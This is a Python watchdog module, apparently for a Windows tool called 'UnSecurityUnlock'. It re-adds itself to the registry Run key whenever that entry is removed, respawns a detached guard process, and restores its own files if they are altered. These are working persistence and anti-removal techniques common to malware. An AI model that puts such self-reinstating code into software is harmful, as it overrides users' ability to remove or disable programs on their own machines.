import os
import subprocess
import sys
import threading
import time
from pathlib import Path

from .logger import logger
from . import selfdefense

AUTOSTART_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
AUTOSTART_NAME = "UnSecurityUnlock"
GUARD_FLAG = "--guard"


def _ensure_autostart() -> None:
    try:
        import winreg
    except ImportError:
        return
    exe = selfdefense.current_exe()
    if not exe:
        return
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_KEY, 0, winreg.KEY_READ | winreg.KEY_SET_VALUE) as k:
            try:
                cur, _ = winreg.QueryValueEx(k, AUTOSTART_NAME)
                if exe.name in cur or str(exe) in cur:
                    return
            except FileNotFoundError:
                pass
            winreg.SetValueEx(k, AUTOSTART_NAME, 0, winreg.REG_SZ, f'"{exe}" --autostart')
            logger.info("watchdog: autostart restored")
    except OSError as e:
        logger.error("watchdog autostart: %s", e)


def _ensure_guard() -> None:
    exe = selfdefense.current_exe()
    if not exe:
        return
    try:
        out = subprocess.run(
            ["tasklist", "/FI", f"IMAGENAME eq {exe.name}", "/NH"],
            capture_output=True, text=True, timeout=10
        ).stdout.lower()
        if out.count(exe.name.lower()) < 2:
            subprocess.Popen([str(exe), GUARD_FLAG], creationflags=0x00000008)
            logger.info("watchdog: guard process spawned")
    except Exception as e:
        logger.error("watchdog guard: %s", e)


def _check_self() -> None:
    if not selfdefense.verify_integrity():
        logger.warning("watchdog: integrity broken, restoring")
        selfdefense.restore_self()


def _loop(interval: int = 5) -> None:
    while True:
        try:
            _ensure_autostart()
            _ensure_guard()
            _check_self()
        except Exception as e:
            logger.error("watchdog loop error: %s", e)
        time.sleep(interval)


def start() -> None:
    t = threading.Thread(target=_loop, daemon=True, name="watchdog")
    t.start()
    logger.info("watchdog started")
